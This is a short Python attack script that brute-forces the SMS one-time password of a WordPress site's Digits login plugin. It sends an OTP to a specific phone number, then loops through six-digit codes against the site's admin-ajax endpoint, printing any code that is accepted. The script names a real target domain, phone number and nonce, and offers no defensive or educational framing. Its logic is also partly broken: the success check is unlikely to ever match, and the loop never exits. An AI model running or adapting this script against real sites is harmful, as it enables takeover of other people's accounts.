import time
import requests
from colorama import Fore
from os import system
system('cls')


# domain : https://rirabook.com/?login=true&page=1&redirect_to=https%3A%2F%2Frirabook.com%2F


url = 'https://rirabook.com/wp-admin/admin-ajax.php'
json = {'accountkit': 0,
        'firebase': 0,
        'code': "1"}

data = {'action':'digits_check_mob',
        'countrycode':'+98',
        'mobileNo':9050756226,
        'csrf':'1fda326dc7',
        'login':1,
        'username':'',
        'email':'',
        'captcha':'',
        'captcha_ses':'',
        'digits':1,
        'json':1,
        'whatsapp':0,
        'mobmail':9050756226,
        'dig_otp':'',
        'dig_nounce':'1fda326dc7',
        'digits_redirect_page':'https://rirabook.com/'}

sned_otp = requests.post(url=url,json=json,data=data).text

if sned_otp == '{"accountkit":0,"firebase":0,"code":"1"}':
    print(Fore.GREEN+'[*] OTP Code Sned phone')
    time.sleep(5)
else:
    print(Fore.RED+'[*] OTP Code Sned Fail')
    time.sleep(5)
    system('cls')

def OTP_Test():
    sh = 100000
    while True:
        sh += 1

        if sh == 999999:
            print(Fore.RED+'[*] OTP test fail')

        print(Fore.YELLOW+"[*]",sh,"Test OTP Code")

        url_vrify = 'https://rirabook.com/wp-admin/admin-ajax.php'

        json_vrify = {'success': True,
                      'data': {'code':11}}

        data_vrify = {'action':'digits_verifyotp_login',
                      'countrycode':'%2B98',
                      'mobileNo':9050756226,
                      'otp':sh,
                      'dig_ftoken':-1,
                      'csrf':'1fda326dc7',
                      'dtype':1,
                      'digits':1,
                      'rememberMe':False}

        Vrify_otp = requests.post(url=url_vrify,data=data_vrify,json=json_vrify).text

    
        if Vrify_otp == "{'success': True,'data': {'code':11}}":
            print(Fore.GREEN+'[*] Phone OTP Code is',sh)
            time.sleep(60)
        else:
            system('cls')
            print(Fore.RED+'[*] OTP test fail')


OTP_Test()